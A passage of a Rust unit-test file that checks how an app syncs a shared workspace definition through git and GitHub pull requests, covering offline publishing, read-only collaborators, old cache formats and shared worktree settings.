    fx.refresh(&repo);
    assert_eq!(fx.ws().accent_color.as_deref(), Some("#111111"));
    assert_eq!(fx.ws().name, "Mine, renamed");

    // State unknown (gh can't say): nothing is published — the PR could
    // still merge over it — nothing is closed, and everything is kept.
    let (fx, repo) = two_fields_in_a_pr();
    fx.workspaces.rename(&fx.ws_id, "Offline rename".into()).unwrap();
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap();
    let publisher = FakePublisher::default();
    let report = publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id)
        .unwrap()
        .unwrap();
    assert!(publisher.requests.borrow().is_empty());
    assert!(publisher.closed.borrow().is_empty());
    assert!(report.error.unwrap().contains("#7"));
    let queue = fx.queue();
    assert_eq!(queue.fields["accentColor"].pull_request, Some(pr7()));
    assert_eq!(queue.fields["name"].value, Value::from("Offline rename"));
    assert_eq!(queue.superseded_pull_requests, vec![pr7()]);
    assert_eq!(fx.ws().name, "Offline rename", "still applied on this Mac");
    // Once GitHub answers (open), both go out together.
    publisher.pr_states.borrow_mut().insert(7, PrState::Open);
    *publisher.branch_text.borrow_mut() = Some(PLY_DEFINITION.to_string());
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap();
    let (_, fields, _) = publisher.requests.borrow()[0].clone();
    assert_eq!(fields.keys().collect::<Vec<_>>(), vec!["accentColor", "name"]);
    assert_eq!(*publisher.closed.borrow(), vec![7], "withdrawn once replaced");
}

// ── Review round 8 (snapshot 8) ───────────────────────────────────────

#[test]
fn a_pr_whose_values_reach_the_branch_another_way_is_still_followed() {
    let (fx, repo) = two_fields_in_a_pr();
    // Someone commits exactly what PR #7 proposes, without merging it.
    repo.put(
        "main",
        DEFINITION_PATH,
        &PLY_DEFINITION
            .replace("#7c3aed", "#000000")
            .replace("\"Ply\"", "\"Mine\""),
        "other",
        "c9",
    );
    let report = fx.refresh(&repo);
    assert!(report.pending_fields.is_empty());
    let queue = fx.queue();
    assert!(queue.fields.is_empty());
    assert_eq!(queue.superseded_pull_requests, vec![pr7()], "not forgotten");
    assert!(queue_path_exists(&fx));

    // The next drain closes it: nothing is left for it to propose.
    let publisher = FakePublisher::default();
    publisher.pr_states.borrow_mut().insert(7, PrState::Open);
    let report = publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id)
        .unwrap()
        .unwrap();
    assert_eq!(report.withdrawn_pull_requests, vec![7]);
    assert!(publisher.requests.borrow().is_empty());
    assert!(fx.queue().is_empty() && !queue_path_exists(&fx));

    // Merged meanwhile instead: settled, nothing to close.
    let (fx, repo) = two_fields_in_a_pr();
    repo.put(
        "main",
        DEFINITION_PATH,
        &PLY_DEFINITION
            .replace("#7c3aed", "#000000")
            .replace("\"Ply\"", "\"Mine\""),
        "reviewer",
        "c9",
    );
    fx.refresh(&repo);
    let publisher = FakePublisher::default();
    publisher.pr_states.borrow_mut().insert(7, PrState::Merged);
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap();
    assert!(publisher.closed.borrow().is_empty());
    assert!(fx.queue().is_empty());
}

#[test]
fn a_direct_publish_withdraws_what_the_saved_fallback_branch_may_have_opened() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "a", "c1");
    fx.refresh(&repo);
    fx.workspaces.rename(&fx.ws_id, "Mine".into()).unwrap();
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap();
    let lost = FakePublisher::default()
        .then(PublishOutcome::Failed("gh pr create: context deadline exceeded".into()));
    publish_pending(&fx.stores(), &repo, &lost, &fx.ws_id).unwrap();
    let saved = fx.queue().pull_request_branch.unwrap();

    fx.workspaces.rename(&fx.ws_id, "Ply".into()).unwrap();
    fx.workspaces
        .set_accent_color(&fx.ws_id, Some("#00ff00".into()))
        .unwrap();
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap();
    let publisher = FakePublisher::default();
    *publisher.branch_text.borrow_mut() = Some(PLY_DEFINITION.to_string());
    let report = publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id)
        .unwrap()
        .unwrap();
    assert_eq!(report.published, vec!["accentColor"]);
    assert_eq!(*publisher.withdrawn_branches.borrow(), vec![saved]);
    assert!(fx.queue().is_empty());
}

#[test]
fn the_page_reads_the_view_again_after_a_save_or_publish() {
    // Card #94: the page keeps no copy of the view to repaint — whichever
    // way the save goes, it reads the authoritative one again before it
    // says anything. A save that failed may still have applied part of the
    // change on this Mac, and a save that landed changed what the rows
    // must show.
    // The sequence itself is `lib/publishDraft.ts`, driven by its own test
    // with a save that settles and a read that fails on command. What is
    // asserted here is that it is the one the page runs, and that both
    // outcomes read the view again: a save that failed may have applied
    // part of the change on this Mac, and one that landed changed what the
    // rows must show.
    let page = include_str!("../../src/components/RepositoryPage.tsx");
    assert!(
        page.contains("publishDraft({"),
        "the page publishes through the tested sequence"
    );
    let sequence = include_str!("../../src/lib/publishDraft.ts");
    let start = sequence
        .find("await input.save(")
        .expect("the sequence publishes with one save");
    let after = &sequence[start..];
    let end = after.find("return true;").expect("the sequence's own end");
    let reads = after[..end].matches("await input.reload()").count();
    assert!(
        reads >= 2,
        "both the failure and the success read the view again, found {reads}"
    );
    // And the read is what lets the page be edited again. Without this the
    // page would be held still for ever after any publish, which no pure
    // test of the session can catch: the session does as it is told.
    assert!(
        sequence.contains("kind: \"publishSaved\"") && sequence.contains("kind: \"publishFailed\""),
        "both ways a save can end reach the session"
    );
    // Every read that completed is told to the session, with whether it
    // brought anything — the reducer is what decides, and a test can hand
    // it either (F3).
    assert!(
        page.contains("kind: \"read\", ok: true") && page.contains("kind: \"read\", ok: false"),
        "a read of either kind reaches the session"
    );
    assert!(
        page.contains("[reads, lastReadOk, dispatch]"),
        "and it is every completed read that does it"
    );
    let hook = include_str!("../../src/hooks/useRepositoryDefinition.ts");
    let failed = hook
        .rfind("setError(String(e));")
        .expect("the read's failure path");
    assert!(
        hook[failed..].contains("setLastReadOk(false)"),
        "a read that failed says so, rather than being silently dropped"
    );
    // The legacy conversion's publish is the adoption banner's, and the
    // edited event it raises brings every open page back in step.
    let banner = include_str!("../../src/components/AdoptionBanner.tsx");
    assert!(banner.contains("workspaceDefinitionPublish("));
}

// ── Review round 9 (snapshot 9) ───────────────────────────────────────

#[test]
fn a_project_edit_is_published_with_the_project_part_this_mac_runs() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "a", "c1");
    fx.refresh(&repo);
    set_pipeline(&fx, "scripts/mine.sh");
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap();
    // Someone removes the project part; the refresh keeps this Mac's config.
    repo.put(
        "main",
        DEFINITION_PATH,
        r##"{ "name": "Ply", "accentColor": "#7c3aed", "board": "githubIssues", "githubOwnerRepo": "MatteoB-adv/atelier" }"##,
        "b",
        "c2",
    );
    fx.refresh(&repo);
    let publisher = FakePublisher::default();
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap();
    let fill = publisher.fills.borrow()[0].clone().expect("a project fill");
    assert_eq!(fill.install_script.as_deref(), Some("scripts/install-local.sh"));
    assert_eq!(fill.version_files.as_ref().map(Vec::len), Some(2));
    assert_eq!(
        fill.verify_pipeline,
        Some(vec![VerifyKind::Script { path: "scripts/mine.sh".into() }])
    );
}

// ── GH #82: read-only collaborators ───────────────────────────────────

#[test]
fn read_permission_makes_the_shared_fields_read_only_and_a_grant_unlocks_them() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "test-owner", "c1");
    *repo.permission.borrow_mut() = Some(false);
    let report = fx.refresh(&repo);
    assert!(report.read_only);
    let cache = fx.cache().unwrap();
    assert_eq!(cache.write_access.can_push, Some(false));
    let view = get_view(&fx.stores(), &repo, &fx.ws_id).unwrap();
    assert!(view.read_only);

    // GitHub can't say (offline): the cached answer stands.
    *repo.permission.borrow_mut() = None;
    assert!(fx.refresh(&repo).read_only);

    // Write granted: the next refresh unlocks.
    *repo.permission.borrow_mut() = Some(true);
    let report = fx.refresh(&repo);
    assert!(!report.read_only);
    assert!(!get_view(&fx.stores(), &repo, &fx.ws_id).unwrap().read_only);
}

#[test]
fn a_read_only_edit_of_a_shared_field_is_put_back_and_never_queued() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "test-owner", "c1");
    *repo.permission.borrow_mut() = Some(false);
    fx.refresh(&repo);

    set_pipeline(&fx, "scripts/mine.sh");
    let err = record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap_err();
    // 1.174.0 (DS2): the row's name, quoted.
    assert!(err.contains("“Checks before shipping” is set in the repository"), "{err}");
    assert!(err.contains("ask for write access to change it"), "{err}");
    assert!(fx.queue().is_empty());
    assert!(fx.cache().unwrap().pending.is_empty());
    assert_eq!(
        fx.configs.get(&fx.ws_id).unwrap().verify_pipeline,
        Some(vec![VerifyKind::Script { path: "scripts/ppvp.sh".into() }]),
        "the repository's value is back"
    );

    // The editor refuses outright.
    let err = save_changes(
        &fx.stores(),
        &repo,
        &fx.ws_id,
        Map::new(),
        serde_json::from_str::<Map<String, Value>>(&with_verify("scripts/x.sh")).unwrap(),
    )
    .unwrap_err();
    assert!(err.contains("ask for write access"), "{err}");
}

/// Findings filter: `Findings that block approval` is this Mac's own, so a
/// read-only collaborator of a shared workspace saves it — it is not put
/// back, not queued, and survives the next refresh.
#[test]
fn a_read_only_collaborator_keeps_the_findings_threshold() {
    use crate::project_config::BlockingThreshold;
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "test-owner", "c1");
    *repo.permission.borrow_mut() = Some(false);
    fx.refresh(&repo);

    crate::project_config::set_blocking_findings(&fx.configs, &fx.ws_id, BlockingThreshold::P1).unwrap();
    // Not a shared field: nothing to put back, so no refusal.
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).expect("not refused");
    assert!(fx.queue().is_empty());
    assert!(fx.cache().unwrap().pending.is_empty());
    assert_eq!(fx.configs.review(&fx.ws_id).blocking_findings, BlockingThreshold::P1);
    fx.refresh(&repo);
    assert_eq!(fx.configs.get(&fx.ws_id).unwrap().blocking_findings, BlockingThreshold::P1, "a refresh keeps it");
}

#[test]
fn a_refused_push_with_no_pull_request_makes_this_mac_read_only_until_granted() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "test-owner", "c1");
    fx.refresh(&repo);
    set_pipeline(&fx, "scripts/mine.sh");
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap();
    let publisher = FakePublisher::default().then(PublishOutcome::Failed(format!(
        "main {} (remote: Permission denied) and the pull request branch too: denied",
        crate::shared_config::REFUSED_MARKER
    )));
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap();
    let cache = fx.cache().unwrap();
    assert!(cache.write_access.read_only());
    assert!(cache.write_access.push_refused.is_some());

    // Offline is not a refusal.
    let fx2 = Fixture::new();
    fx2.refresh(&repo);
    set_pipeline(&fx2, "scripts/mine.sh");
    record_local_edit(&fx2.stores(), &repo, &fx2.ws_id, false).unwrap();
    let offline = FakePublisher::default().then(PublishOutcome::Unreachable("offline".into()));
    publish_pending(&fx2.stores(), &repo, &offline, &fx2.ws_id).unwrap();
    assert!(!fx2.cache().unwrap().write_access.read_only());

    // GitHub already saying "push" is no evidence a push would now get
    // through (branch rules, other credentials): the refusal stands, across
    // repeated answers.
    *repo.permission.borrow_mut() = Some(true);
    fx.refresh(&repo);
    fx.refresh(&repo);
    assert!(fx.cache().unwrap().write_access.read_only());

    // A grant — read becoming write — clears it.
    *repo.permission.borrow_mut() = Some(false);
    fx.refresh(&repo);
    *repo.permission.borrow_mut() = Some(true);
    fx.refresh(&repo);
    assert!(!fx.cache().unwrap().write_access.read_only());

    // So does a publish that gets through.
    let fx3 = Fixture::new();
    let repo3 = FakeRepo::new();
    repo3.put("main", DEFINITION_PATH, PLY_DEFINITION, "test-owner", "c1");
    *repo3.permission.borrow_mut() = Some(true);
    fx3.refresh(&repo3);
    set_pipeline(&fx3, "scripts/mine.sh");
    record_local_edit(&fx3.stores(), &repo3, &fx3.ws_id, false).unwrap();
    let refused = FakePublisher::default().then(PublishOutcome::Failed(format!(
        "main {} (protected branch) and the pull request branch too: denied",
        crate::shared_config::REFUSED_MARKER
    )));
    publish_pending(&fx3.stores(), &repo3, &refused, &fx3.ws_id).unwrap();
    fx3.refresh(&repo3);
    assert!(fx3.cache().unwrap().write_access.read_only(), "survives the refresh after it");
    let def = parse_definition(with_verify("scripts/mine.sh").as_bytes()).unwrap();
    let through = FakePublisher::default().then(PublishOutcome::Published {
        conflicts: Default::default(),
        commit: "c2".into(),
        definition: def,
        author: Some("test-owner".into()),
        fields: vec!["verifyPipeline".into()],
        overrides: vec![],
        pushed: true,
    });
    publish_pending(&fx3.stores(), &repo3, &through, &fx3.ws_id).unwrap();
    assert!(!fx3.cache().unwrap().write_access.read_only());
}

#[test]
fn a_cache_from_before_gh_82_loads_with_unknown_write_access() {
    let fx = Fixture::new();
    let path = cache_path(&fx.configs, &fx.ws_id);
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    let before = br##"{
  "schemaVersion": 1,
  "definition": { "schemaVersion": 1, "name": "Ply", "board": "local" },
  "source": "repo",
  "branch": "main",
  "commit": "c1",
  "author": "test-owner",
  "refreshedAt": 1,
  "pending": {},
  "pendingState": null
}"##;
    std::fs::write(&path, before).unwrap();
    let cache = fx.cache().unwrap();
    assert_eq!(cache.write_access, WriteAccess::default());
    assert!(!cache.write_access.read_only());
    assert_eq!(std::fs::read(&path).unwrap(), before.to_vec(), "loading writes nothing");
}

#[test]
fn field_provenance_names_who_last_changed_each_field() {
    let dir = tempfile::tempdir().unwrap();
    let run = |args: &[&str], name: &str| {
        let out = crate::platform::git_command()
            .args(args)
            .current_dir(dir.path())
            .env("GIT_AUTHOR_NAME", name)
            .env("GIT_AUTHOR_EMAIL", "a@example.com")
            .env("GIT_COMMITTER_NAME", name)
            .env("GIT_COMMITTER_EMAIL", "a@example.com")
            .output()
            .unwrap();
        assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
    };
    run(&["init", "-q", "-b", "main"], "x");
    std::fs::create_dir_all(dir.path().join(".atelier")).unwrap();
    std::fs::write(dir.path().join(DEFINITION_PATH), PLY_DEFINITION).unwrap();
    run(&["add", "."], "x");
    run(&["commit", "-q", "-m", "one"], "alice");
    std::fs::write(dir.path().join(DEFINITION_PATH), with_verify("scripts/b.sh")).unwrap();
    run(&["commit", "-q", "-am", "two"], "bob");
    let repo = GitRepo {
        cwd: dir.path().to_path_buf(),
    };
    let provenance = repo.field_provenance("main", "main");
    assert_eq!(provenance["verifyPipeline"].author, "bob");
    assert_eq!(provenance["name"].author, "alice");
    assert!(provenance["name"].changed_at > 0);
    // 1.173.0 (B1): who set the areas, like any shared field.
    assert!(!provenance.contains_key("areas"), "never set: no one");
    let three = with_areas(TWO_AREAS).replace("scripts/ppvp.sh", "scripts/b.sh");
    std::fs::write(dir.path().join(DEFINITION_PATH), three).unwrap();
    run(&["commit", "-q", "-am", "three"], "carol");
    let provenance = repo.field_provenance("main", "main");
    assert_eq!(provenance["areas"].author, "carol");
    assert_eq!(provenance["verifyPipeline"].author, "bob");
}

// ── ADR 0006 (third card): the review settings travel ─────────────────

/// A definition written before `selfCheck` and `reviewChecklist` loads with
/// the switch on and no classes; one that carries them reaches this Mac's
/// config on the next read (Sync on the mini), and an edit here is queued
/// for the branch like any shared field (Add a class on the MacBook).
#[test]
fn the_review_checklist_round_trips_and_an_older_definition_loads_without_it() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "a", "c1");
    fx.refresh(&repo);
    let cfg = fx.configs.get(&fx.ws_id).unwrap();
    assert!(cfg.self_check, "older definitions: the self-check is on");
    assert!(cfg.review_checklist.is_empty(), "older definitions: no classes");
    let old = parse_definition(PLY_DEFINITION.as_bytes()).unwrap();
    assert_eq!((old.self_check, old.review_checklist), (None, None));

    // The MacBook adds a class: applied here, queued for the branch.
    crate::project_config::set_review(
        &fx.configs,
        &fx.ws_id,
        None,
        Some(vec![ReviewChecklistClass {
            name: "Branch discovery".into(),
            sentence: "Every branch lookup names the remote it reads.".into(),
        }]),
        Some(Vec::new()),
    )
    .unwrap();
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap();
    let queued = &fx.queue().fields["reviewChecklist"];
    assert_eq!(
        queued.value,
        serde_json::json!([{ "name": "Branch discovery", "sentence": "Every branch lookup names the remote it reads." }])
    );

    // The mini: the branch carries it and the switch turned off.
    let fx2 = Fixture::new();
    let with = PLY_DEFINITION.replace(
        "\"installScript\"",
        "\"selfCheck\": false,\n  \"reviewChecklist\": [{ \"name\": \"Branch discovery\", \"sentence\": \"Every branch lookup names the remote it reads.\" }],\n  \"installScript\"",
    );
    repo.put("main", DEFINITION_PATH, &with, "b", "c2");
    fx2.refresh(&repo);
    let cfg = fx2.configs.get(&fx2.ws_id).unwrap();
    assert!(!cfg.self_check);
    assert_eq!(cfg.review_checklist.len(), 1);
    assert_eq!(cfg.review_checklist[0].name, "Branch discovery");
    let checklist = crate::review_passes::risk_checklist(&cfg.review_checklist);
    assert!(checklist.ends_with("\nJ. Branch discovery — Every branch lookup names the remote it reads."));
}

/// GH #111 F3/F9: a definition whose checklist breaks the limits is refused
/// like any unusable file — the last good copy stays, the reason shows — and
/// the JSON editor cannot save one either.
#[test]
fn a_checklist_over_its_limits_keeps_the_last_good_definition() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    let good = PLY_DEFINITION.replace(
        "\"installScript\"",
        "\"reviewChecklist\": [{ \"name\": \"Branch discovery\", \"sentence\": \"Names the remote.\" }],\n  \"installScript\"",
    );
    repo.put("main", DEFINITION_PATH, &good, "a", "c1");
    fx.refresh(&repo);
    assert_eq!(fx.configs.get(&fx.ws_id).unwrap().review_checklist.len(), 1);

    let fourteen: Vec<String> = (0..14)
        .map(|i| format!("{{ \"name\": \"Class {i}\", \"sentence\": \"Look.\" }}"))
        .collect();
    let bad = PLY_DEFINITION.replace(
        "\"installScript\"",
        &format!("\"reviewChecklist\": [{}],\n  \"installScript\"", fourteen.join(", ")),
    );
    repo.put("main", DEFINITION_PATH, &bad, "b", "c2");
    fx.refresh(&repo);
    let unreadable = fx.cache().unwrap().unreadable.expect("reported");
    assert!(unreadable.message.contains("at most 12"), "{}", unreadable.message);
    assert_eq!(fx.configs.get(&fx.ws_id).unwrap().review_checklist.len(), 1, "last good copy");

    let no_sentence = PLY_DEFINITION.replace(
        "\"installScript\"",
        "\"reviewChecklist\": [{ \"name\": \"Bare\" }],\n  \"installScript\"",
    );
    let err = parse_definition(no_sentence.as_bytes()).unwrap_err();
    assert!(err.message.contains("needs its sentence"), "{}", err.message);

    // The JSON editor: an over-limit list is refused with the reason.
    repo.put("main", DEFINITION_PATH, &good, "a", "c3");
    fx.refresh(&repo);
    let base = to_map(&get_view(&fx.stores(), &repo, &fx.ws_id).unwrap().effective.unwrap());
    let mut draft = base.clone();
    draft.insert("reviewChecklist".into(), serde_json::json!([{ "name": "x".repeat(400), "sentence": "y" }]));
    let err = save_changes(&fx.stores(), &repo, &fx.ws_id, base, draft).unwrap_err();
    assert!(err.contains("a class is at most 300"), "{err}");
}

/// GH #111 F22/F34: the review settings are shared on their own. A
/// definition with identity and board only, on a Mac with no project
/// config: a class saved here (in `review.json`) is queued for the branch,
/// and no project field travels with it; another such Mac receives it into
/// its `review.json` on the next read, no project config made.
#[test]
fn review_settings_travel_without_a_project_part() {
    let identity = r#"{ "name": "Shared", "board": "local" }"#;
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, identity, "a", "c1");
    fx.refresh(&repo);
    assert!(fx.configs.get(&fx.ws_id).is_none());
    let class = ReviewChecklistClass {
        name: "Branch discovery".into(),
        sentence: "Names the remote it reads.".into(),
    };
    crate::project_config::set_review(&fx.configs, &fx.ws_id, Some(false), Some(vec![class.clone()]), Some(vec![]))
        .unwrap();
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap();
    let mut queued: Vec<String> = fx.queue().fields.keys().cloned().collect();
    queued.sort();
    assert_eq!(queued, vec!["reviewChecklist", "selfCheck"], "no project field travels");

    // With a local project config but no shared project part: the same two
    // fields only, never the local build settings.
    let fx_cfg = Fixture::new();
    fx_cfg.configs.set(&fx_cfg.ws_id, crate::project_config::default_atelier_config()).unwrap();
    repo.put("main", DEFINITION_PATH, identity, "a", "c1");
    fx_cfg.refresh(&repo);
    crate::project_config::set_review(&fx_cfg.configs, &fx_cfg.ws_id, None, Some(vec![class.clone()]), None).unwrap();
    record_local_edit(&fx_cfg.stores(), &repo, &fx_cfg.ws_id, false).unwrap();
    let queued: Vec<String> = fx_cfg.queue().fields.keys().cloned().collect();
    assert_eq!(queued, vec!["reviewChecklist"]);

    // The other Mac, no project config: Sync brings both.
    let other = Fixture::new();
    let published = r#"{ "name": "Shared", "board": "local", "selfCheck": false,
        "reviewChecklist": [{ "name": "Branch discovery", "sentence": "Names the remote it reads." }] }"#;
    repo.put("main", DEFINITION_PATH, published, "b", "c2");
    other.refresh(&repo);
    assert!(other.configs.get(&other.ws_id).is_none(), "no project config is made");
    let review = other.configs.review(&other.ws_id);
    assert!(!review.self_check);
    assert_eq!(review.review_checklist, vec![class]);
    assert!(!parse_definition(published.as_bytes()).unwrap().has_project());
}

// ── Card #94: the cache's `changedAt`, and the branch choices ──────────

#[test]
fn a_cache_written_before_changed_at_still_loads() {
    // The field is new (card #94): a cache on disk from before it has no
    // `changedAt`, and must read back with every other field intact.
    let fx = Fixture::new();
    let path = cache_path(&fx.configs, &fx.ws_id);
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    std::fs::write(
        &path,
        br#"{ "schemaVersion": 1,
              "definition": { "schemaVersion": 1, "name": "LYRA", "board": "local" },
              "source": "repo", "branch": "staging", "commit": "c1",
              "author": "MatteoB-adv", "refreshedAt": 1700000000000,
              "unreadable": null, "pending": {}, "pendingState": null }"#,
    )
    .unwrap();
    let cache = load_cache(&fx.configs, &fx.ws_id).expect("an old cache still loads");
    assert_eq!(cache.changed_at, None, "an old cache simply doesn't know");
    assert_eq!(cache.author.as_deref(), Some("MatteoB-adv"));
    assert_eq!(cache.branch.as_deref(), Some("staging"));
    assert_eq!(cache.definition.map(|d| d.name), Some("LYRA".to_string()));

    // And a cache written today round-trips the new field.
    let mut written = DefinitionCache::empty();
    written.changed_at = Some(1_700_000_123);
    save_cache(&fx.configs, &fx.ws_id, &written).unwrap();
    assert_eq!(
        load_cache(&fx.configs, &fx.ws_id).unwrap().changed_at,
        Some(1_700_000_123)
    );
}

#[test]
fn a_refresh_records_when_the_definition_last_changed() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put(
        "main",
        DEFINITION_PATH,
        r#"{ "schemaVersion": 1, "name": "LYRA", "board": "local" }"#,
        "MatteoB-adv",
        "c1",
    );
    fx.refresh(&repo);
    assert_eq!(fx.cache().unwrap().changed_at, Some(1_700_000_000));
}

#[test]
fn branch_choices_keep_the_branch_in_use_and_the_default() {
    let repo = FakeRepo::new();
    // A repo whose refs say nothing still offers the two branches Ply knows,
    // and always names the default branch: a workspace with neither a shared
    // definition nor a config on this Mac takes its target branch from it,
    // rather than guessing "main".
    // A fake repo reads no refs: the list stays empty, so the row can say
    // it cannot choose instead of offering a branch nobody read (F7).
    let choices = branch_choices(&repo, Some("staging"));
    assert!(choices.branches.is_empty());
    assert_eq!(choices.default_branch, "main");
    assert_eq!(choices.error, None, "the fake's fetch goes through");
    assert!(!choices.has_origin);

    // With refs, the default branch and the branch in use are always in it.
    struct WithBranches(FakeRepo, Vec<String>, Option<String>);
    impl RepoSource for WithBranches {
        fn default_branch(&self) -> String {
            self.0.default_branch()
        }
        fn fetch(&self, branch: &str) -> Result<(), String> {
            self.0.fetch(branch)
        }
        fn fetch_branches(&self) -> Result<(), String> {
            match &self.2 {
                Some(e) => Err(e.clone()),
                None => Ok(()),
            }
        }
        fn read(&self, branch: &str, path: &str) -> Option<RepoFile> {
            self.0.read(branch, path)
        }
        fn branch_exists(&self, branch: &str) -> bool {
            self.0.branch_exists(branch)
        }
        fn branches(&self) -> Vec<String> {
            self.1.clone()
        }
        fn has_origin(&self) -> bool {
            true
        }
    }
    let ok = WithBranches(FakeRepo::new(), vec!["feature".into()], None);
    let choices = branch_choices(&ok, Some("staging"));
    assert_eq!(
        choices.branches,
        vec!["feature".to_string(), "main".to_string(), "staging".to_string()],
    );
    assert_eq!(choices.error, None);

    // A fetch that failed says so and offers nothing: the row is disabled
    // with its reason rather than choosing from stale refs.
    let offline = WithBranches(
        FakeRepo::new(),
        vec!["feature".into()],
        Some("could not resolve host github.com".into()),
    );
    let choices = branch_choices(&offline, Some("staging"));
    assert_eq!(choices.branches, vec!["feature".to_string()], "refs, unpadded");
    assert_eq!(
        choices.error.as_deref(),
        Some("could not resolve host github.com"),
    );
    assert_eq!(choices.trouble, Some(crate::shared_config::PublishTrouble::Network));
    // Windows walk (C4): a read refused for a sign-in is said as one, never
    // as offline.
    let sign_in = WithBranches(
        FakeRepo::new(),
        vec![],
        Some("fatal: could not read Username for 'https://github.com': terminal prompts disabled".into()),
    );
    assert_eq!(
        branch_choices(&sign_in, None).trouble,
        Some(crate::shared_config::PublishTrouble::GitSignIn)
    );
    assert_eq!(branch_choices(&ok, None).trouble, None);
}

#[test]
fn an_offline_attempt_is_remembered_in_the_queue() {
    // Card #94 review, F19: a page opened after the attempt has no refresh
    // report to read, so "you're offline" has to survive in the queue.
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "a", "c1");
    fx.refresh(&repo);
    set_pipeline(&fx, "scripts/mine.sh");
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap();

    let publisher =
        FakePublisher::default().then(PublishOutcome::Unreachable("no route to host".into()));
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap();
    let queue = fx.queue();
    assert_eq!(queue.last_error.as_deref(), Some("no route to host"));
    assert!(queue.last_offline, "the attempt knew it was offline");

    // A failure that is not the network says so, and the next success
    // clears both.
    let publisher = FakePublisher::default().then(PublishOutcome::Failed("refused".into()));
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap();
    assert!(!fx.queue().last_offline, "a refusal is not being offline");

    let publisher = FakePublisher::default();
    *publisher.branch_text.borrow_mut() = Some(PLY_DEFINITION.to_string());
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap();
    assert_eq!(fx.queue().last_error, None);
    assert!(!fx.queue().last_offline);
}

#[test]
fn a_queue_written_before_last_offline_still_loads() {
    let fx = Fixture::new();
    let path = crate::shared_config::queue_path(&fx.configs, &fx.ws_id);
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    std::fs::write(
        &path,
        br#"{ "schemaVersion": 1, "createDefinition": false,
              "fields": {}, "lastError": "no route to host",
              "createPullRequest": null, "pullRequestBranch": null,
              "supersededPullRequests": [] }"#,
    )
    .unwrap();
    let queue = load_queue(&fx.configs, &fx.ws_id);
    assert_eq!(queue.last_error.as_deref(), Some("no route to host"));
    assert!(!queue.last_offline, "an old queue simply doesn't know");
}

// ── SL-4: the worktree settings ───────────────────────────────────────

const WITH_WORKTREE: &str = r#"{
  "name": "Shared",
  "board": "local",
  "worktreeCopy": [".env", "apps/*/.env.local"],
  "worktreeSetup": "npm ci"
}"#;

#[test]
fn the_repos_worktree_settings_reach_this_mac_and_keep_its_own_answer() {
    use crate::worktree_setup::{load_settings, save_settings, EnvProposalAnswer, WorktreeSettings};
    let fx = Fixture::new();
    // This Mac said "Don't copy" before the repository set anything.
    save_settings(
        &fx.configs,
        &fx.ws_id,
        &WorktreeSettings { env_proposal: Some(EnvProposalAnswer::DontCopy), ..Default::default() },
    )
    .unwrap();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, WITH_WORKTREE, "someone", "c1");
    let report = fx.refresh(&repo);
    let labels: Vec<(&str, &str)> = report
        .changes
        .iter()
        .map(|c| (c.field.as_str(), c.label.as_str()))
        .filter(|(f, _)| f.starts_with("worktree"))
        .collect();
    assert_eq!(
        labels,
        vec![
            ("worktreeCopy", "Files copied into card worktrees"),
            ("worktreeSetup", "Before the Builder starts, run")
        ]
    );
    let local = load_settings(&fx.configs, &fx.ws_id);
    assert_eq!(local.worktree_copy, Some(vec![".env".into(), "apps/*/.env.local".into()]));
    assert_eq!(local.setup_command(), Some("npm ci"));
    assert_eq!(local.env_proposal, Some(EnvProposalAnswer::DontCopy), "this Mac's answer stays");

    // The repository clears the command: so does this Mac, nothing else.
    repo.put(
        "main",
        DEFINITION_PATH,
        r#"{ "name": "Shared", "board": "local", "worktreeCopy": [".env", "apps/*/.env.local"] }"#,
        "someone",
        "c2",
    );
    let report = fx.refresh(&repo);
    assert_eq!(report.changes.iter().map(|c| c.field.as_str()).collect::<Vec<_>>(), vec!["worktreeSetup"]);
    let local = load_settings(&fx.configs, &fx.ws_id);
    assert_eq!(local.setup_command(), None);
    assert_eq!(local.copy_entries().len(), 2);
    assert!(fx.refresh(&repo).changes.is_empty(), "nothing changed since");
}

#[test]
fn a_definition_from_before_the_worktree_settings_loads_and_changes_nothing() {
    // Tier 2: every definition written before SL-4.
